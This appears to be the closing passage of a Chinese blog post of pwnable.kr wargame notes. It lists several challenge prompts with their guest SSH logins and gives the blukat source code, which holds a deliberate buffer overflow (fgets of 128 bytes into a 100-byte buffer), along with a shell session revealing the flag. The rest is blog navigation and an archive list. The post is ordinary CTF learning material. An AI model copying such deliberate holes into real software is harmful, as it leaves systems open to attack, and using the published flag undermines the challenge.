+<h1 id="asm-6-pt"><a href="#asm-6-pt" class="headerlink" title="asm - 6 pt"></a>asm - 6 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy! I think I know how to make shellcodes</span><br><span class="line"></span><br><span class="line">ssh asm@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure>
+
+<h1 id="unlink-10-pt"><a href="#unlink-10-pt" class="headerlink" title="unlink - 10 pt"></a>unlink - 10 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy! how can I exploit unlink corruption?</span><br><span class="line"></span><br><span class="line">ssh unlink@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure>
+
+<h1 id="blukat-3-pt"><a href="#blukat-3-pt" class="headerlink" title="blukat - 3 pt"></a>blukat - 3 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sometimes, pwnable is strange...</span><br><span class="line">hint: if this challenge is hard, you are a skilled player.</span><br><span class="line"></span><br><span class="line">ssh blukat@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> *key = <span class="string">"3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calc_flag</span><span class="params">(<span class="keyword">char</span> *s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++) &#123;</span><br><span class="line">        flag[i] = s[i] ^ key[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FILE *fp = fopen(<span class="string">"/home/blukat/password"</span>, <span class="string">"r"</span>);</span><br><span class="line">    fgets(password, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"guess the password!\n"</span>);</span><br><span class="line">    fgets(buf, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password, buf)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"congrats! here is your flag: "</span>);</span><br><span class="line">        calc_flag(password);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"wrong guess!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">blukat@pwnable:~$ ls -al</span><br><span class="line">total 36</span><br><span class="line">drwxr-x---   4 root blukat     4096 Aug 16  2018 .</span><br><span class="line">drwxr-xr-x 116 root root       4096 Apr 17 14:10 ..</span><br><span class="line">-r-xr-sr-x   1 root blukat_pwn 9144 Aug  8  2018 blukat</span><br><span class="line">-rw-r--r--   1 root root        645 Aug  8  2018 blukat.c</span><br><span class="line">dr-xr-xr-x   2 root root       4096 Aug 16  2018 .irssi</span><br><span class="line">-rw-r-----   1 root blukat_pwn   33 Jan  6  2017 password</span><br><span class="line">drwxr-xr-x   2 root root       4096 Aug 16  2018 .pwntools-cache</span><br><span class="line"></span><br><span class="line">blukat@pwnable:~$ cat password</span><br><span class="line">cat: password: Permission denied</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">blukat@pwnable:~$ ./blukat</span><br><span class="line">guess the password!</span><br><span class="line">cat: password: Permission denied</span><br><span class="line">congrats! here is your flag: Pl3as_DonT_Miss_youR_GrouP_Perm!!</span><br></pre></td></tr></table></figure>
+
+<h1 id="horcruxes-7-pt"><a href="#horcruxes-7-pt" class="headerlink" title="horcruxes - 7 pt"></a>horcruxes - 7 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Voldemort concealed his splitted soul inside 7 horcruxes.</span><br><span class="line">Find all horcruxes, and ROP it!</span><br><span class="line">author: jiwon choi</span><br><span class="line"></span><br><span class="line">ssh horcruxes@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://wywwzjj.top">wywwzjj</a>
+            </p><p>原文链接：<a href="https://wywwzjj.top/2020/10/10/pwnable.kr/">https://wywwzjj.top/2020/10/10/pwnable.kr/</a>
+            </p><p>发表日期：<a href="https://wywwzjj.top/2020/10/10/pwnable.kr/">October 10th 2020, 12:56:50 pm</a>
+            </p><p>更新日期：<a href="https://wywwzjj.top/2020/10/10/pwnable.kr/">October 15th 2020, 11:40:26 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2020/10/07/二进制学习/" title="二进制学习">
+                    <div class="prevTitle">二进制学习</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="//github.com/wywwzjj" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <a href="//twitter.com/wywwzjj" class="iconfont-archer twitter" target="_blank" title="twitter"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title="qq">
+                  
+                  <img class="profile-qr" src="/assets/QQ.png">
+                </span>
+            
+        
+    
+        
+    
+        
+            
+                <a href="mailto:wywwzjj@gmail.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">阅读次数: <span id="busuanzi_value_site_pv"></span> : )</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fd-1-pt"><span class="toc-number">1.</span> <span class="toc-text">fd - 1 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#collision-3-pt"><span class="toc-number">2.</span> <span class="toc-text">collision - 3 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bof-5-pt"><span class="toc-number">3.</span> <span class="toc-text">bof - 5 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag-7-pt"><span class="toc-number">4.</span> <span class="toc-text">flag - 7 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#passcode-10-pt"><span class="toc-number">5.</span> <span class="toc-text">passcode - 10 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#random-1-pt"><span class="toc-number">6.</span> <span class="toc-text">random - 1 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#input-4-pt"><span class="toc-number">7.</span> <span class="toc-text">input - 4 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#leg-2-pt"><span class="toc-number">8.</span> <span class="toc-text">leg - 2 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mistake-1-pt"><span class="toc-number">9.</span> <span class="toc-text">mistake - 1 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shellshock-1-pt"><span class="toc-number">10.</span> <span class="toc-text">shellshock - 1 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#coin1-6-pt"><span class="toc-number">11.</span> <span class="toc-text">coin1 - 6 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#blackjack-1-pt"><span class="toc-number">12.</span> <span class="toc-text">blackjack - 1 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lotto-2-pt"><span class="toc-number">13.</span> <span class="toc-text">lotto - 2 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cmd1-1-pt"><span class="toc-number">14.</span> <span class="toc-text">cmd1 - 1 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cmd2-9-pt"><span class="toc-number">15.</span> <span class="toc-text">cmd2 - 9 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#uaf-8-pt"><span class="toc-number">16.</span> <span class="toc-text">uaf - 8 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#memcpy-10-pt"><span class="toc-number">17.</span> <span class="toc-text">memcpy - 10 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#asm-6-pt"><span class="toc-number">18.</span> <span class="toc-text">asm - 6 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unlink-10-pt"><span class="toc-number">19.</span> <span class="toc-text">unlink - 10 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#blukat-3-pt"><span class="toc-number">20.</span> <span class="toc-text">blukat - 3 pt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#horcruxes-7-pt"><span class="toc-number">21.</span> <span class="toc-text">horcruxes - 7 pt</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 61
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/10</span><a class="archive-post-title" href="/2020/10/10/pwnable.kr/">pwnable.kr</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/07</span><a class="archive-post-title" href="/2020/10/07/二进制学习/">二进制学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/23</span><a class="archive-post-title" href="/2020/06/23/frida初体验/">Frida 初体验</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/22</span><a class="archive-post-title" href="/2020/03/22/LeetCode-Weekly-Contest-181/">LeetCode Weekly Contest 181</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/22</span><a class="archive-post-title" href="/2020/03/22/LeetCode-Weekly-Contest-22/">LeetCode Weekly Contest 22（双周赛）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href="/2020/03/21/LeetCode-数据库专题/">LeetCode 数据库专题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span><a class="archive-post-title" href="/2020/03/08/LeetCode-Weekly-Contest-179/">LeetCode Weekly Contest 179</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span><a class="archive-post-title" href="/2020/03/08/LeetCode-Weekly-Contest-21/">LeetCode Weekly Contest 21（双周赛）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/LeetCode-Weekly-Contest-177/">LeetCode Weekly Contest 177</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2020/01/30/ThinkPHP-3-X-5-X-order-by-注入/">ThinkPHP 3.X / 5.X order by 注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/24</span><a class="archive-post-title" href="/2020/01/24/Go-学习/">Go 学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span><a class="archive-post-title" href="/2020/01/23/PHP-FPM-RCE/">PHP-FPM RCE (CVE-2019-11043)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/17</span><a class="archive-post-title" href="/2020/01/17/ThinkPHP-6.0-任意文件写入/">ThinkPHP 6.0 任意文件写入</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/2019/12/16/CSAPP-Chapter-12-Notes/">CSAPP 并发编程 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href="/2019/12/15/smarty-3.1.31-RCE/">smarty 3.1.31 RCE（CVE-2017-1000480）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href="/2019/12/02/CSAPP-Chapter-11-Notes/">CSAPP 网络编程 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href="/2019/11/25/CSAPP-Chapter-10-Notes/">CSAPP 系统级 IO 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/21</span><a class="archive-post-title" href="/2019/11/21/ThinkCMF-前台模板注入-RCE/">ThinkCMF 前台模板注入 RCE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/2019/11/11/CSAPP-Chapter-9-Notes/">CSAPP 虚拟存储器 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2019/10/28/CSAPP-Chapter-8-Notes/">CSAPP 异常控制流 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/24</span><a class="archive-post-title" href="/2019/10/24/Python-pickle-反序列化实例分析/">Python pickle 反序列化实例分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/21</span><a class="archive-post-title" href="/2019/10/21/CSAPP-Chapter-6-Notes/">CSAPP 存储器层次结构 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/10</span><a class="archive-post-title" href="/2019/10/10/CSAPP-Chapter-3-Notes/">CSAPP 程序的机器级表示 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/06</span><a class="archive-post-title" href="/2019/10/06/BalsnCTF-2019-web题/">Balsn CTF 2019 web 题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/08</span><a class="archive-post-title" href="/2019/09/08/CSAPP-Chapter-2-Notes/">CSAPP 信息的表示和处理 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href="/2019/09/01/CSAPP-Chapter-1-Notes/">CSAPP 计算机系统漫游 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/20</span><a class="archive-post-title" href="/2019/08/20/当PHP反序列化遇上SSRF/">当 PHP 反序列化遇上 SSRF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/2019/07/18/Discuz-ML!-V3.X-RCE/">Discuz ML! V3.X RCE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span><a class="archive-post-title" href="/2019/07/11/PHP-写入配置文件经典问题/">PHP 写配置文件经典问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/phar-与反序列化学习/">phar 与反序列化学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href="/2019/05/17/Redis-未授权访问相关利用/">Redis 未授权访问相关利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href="/2019/05/12/命令注入总结/">命令注入总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span><a class="archive-post-title" href="/2019/04/07/vulnhub-靶机实战系列-HackInOS/">vulnhub 靶机实战系列 HackInOS</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href="/2019/04/04/Leetcode-322-Coin-Change/">Leetcode 322.Coin Change[DP]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/无字母数字-webshell/">无字母数字 webshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href="/2019/03/02/PHP-SECURITY-CALENDAR-2017/">PHP SECURITY CALENDAR Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/sqlmap-tamper-列表/">sqlmap tamper 列表</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span><a class="archive-post-title" href="/2019/02/26/Jarvis-OJ-inject/">Jarvis OJ inject</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/25</span><a class="archive-post-title" href="/2019/02/25/Jarvis-OJ-phpinfo/">Jarvis OJ phpinfo</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/02</span><a class="archive-post-title" href="/2019/02/02/Hackme-Writeup/">Hackme-Web-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/02</span><a class="archive-post-title" href="/2019/02/02/Jarvis-OJ-Writeup/">Jarvis OJ Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/01</span><a class="archive-post-title" href="/2019/02/01/Prompt-1-xss-通关记录/">Prompt 1 to win 通关记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019-Fireshell-Web-Vice/">2019 fireshell web Vice</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-Web/">安恒杯 一月 web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/POJ-2352-Stars-树状数组/">POJ 2352 Stars[树状数组]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/POJ-2352-Stars-树状数组/">POJ 2352 Stars[树状数组]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/2017-NJCTF-Guess/">2017 NJCTF web guess</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/Code-Breaking-Writeup/">Code Breaking Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/22</span><a class="archive-post-title" href="/2018/12/22/优雅实现哈夫曼编码/">优雅实现哈夫曼编码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href="/2018/12/08/Please_don't_stop_rua_233333/">Please don't stop rua 233333</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/30</span><a class="archive-post-title" href="/2018/11/30/Docker-常用命令/">Docker-常用命令清单</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/23</span><a class="archive-post-title" href="/2018/11/23/漏洞练习平台及工具/">漏洞练习平台及工具</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/2018/11/02/Sqli-labs-通关记录/">Sqli-labs 通关笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href="/2018/10/23/Raccoon-Writeup/">Raccoon web Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/02</span><a class="archive-post-title" href="/2018/10/02/学习一项技能要花多少时间/">学习一项技能要花多少时间？</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/2018/09/26/Bugku-Web-writeup/">Bugku Web 部分WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span><a class="archive-post-title" href="/2018/07/28/ACM-常用Trick/">ACM 常用小 Trick</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/16</span><a class="archive-post-title" href="/2018/05/16/十年学会编程/">Teach Yourself Programming in Ten Years</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href="/2018/01/25/Hello-World/">Hello World</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
